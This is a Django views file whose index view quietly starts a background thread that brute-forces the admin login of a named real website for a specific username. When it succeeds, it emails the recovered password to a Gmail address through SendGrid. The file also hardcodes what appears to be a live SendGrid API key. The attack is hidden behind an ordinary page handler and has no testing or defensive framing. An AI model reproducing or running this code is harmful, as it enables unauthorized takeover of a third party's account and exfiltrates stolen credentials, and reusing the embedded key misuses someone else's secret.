import os
from django.shortcuts import render
from django.conf import settings
from django.http import HttpResponse

from . import database
from .models import PageView

from django.http import HttpResponse
import requests
from bs4 import BeautifulSoup
from string import digits, ascii_uppercase, ascii_lowercase
from itertools import product
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail
import threading

def send_sendgrid_mail(password):
	message = {
		'personalizations': [
			{
				'to': [
					{
						'email': 'wolfmonster3@gmail.com'
					}
				],
				'subject': 'Password for pradyumna'
			}
		],
		'from': {
			'email': 'wolfmonster3@gmail.com'
		},
		'reply_to': {
			'email': 'wolfmonster3@gmail.com'
		},
		'content': [
			{
				'type': 'text/html',
				'value': password
			}
		]
	}
	try:
		sg = SendGridAPIClient('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')
		response = sg.send(message)
		if response.status_code == 202:
			context = {
				'sent': True
			}
		else:
			context = {
				'sent': False
			}
	except Exception as e:
		context = {
			'sent': False
		}

def background_process():
    print("Hello")
    url = "https://www.bits-bosm.org/admin/login/?next=/admin/"

    client = requests.session()

    # Retrieve the CSRF token first
    req = client.get(url) # sets cookie
    chars = ascii_lowercase + ascii_uppercase + digits + '`~!@#$%^&*()_+'
    break_loop = False
    for n in range(8, 15+1):
        print(n)
        if break_loop:
            break
        for comb in product(chars, repeat=n):
            password = ''.join(comb)
            csrftoken = client.cookies['csrftoken']
            print(password)
            data = {
                'csrfmiddlewaretoken': csrftoken,
                'username': 'pradyumna',
                'password': password
            }

            r = client.post(url, data=data, headers=dict(Referer=url))
            soup = BeautifulSoup(r.content, 'html5lib')
            try:
                soup.find_all('input')[0].get('value')
            except Exception as e:
                send_sendgrid_mail(password)
                break_loop = True
                break

# Create your views here.

def index(request):
    t = threading.Thread(target=background_process, args=(), kwargs={})
    t.setDaemon(True)
    t.start()
    return HttpResponse("main thread content")

def health(request):
    return HttpResponse(PageView.objects.count())
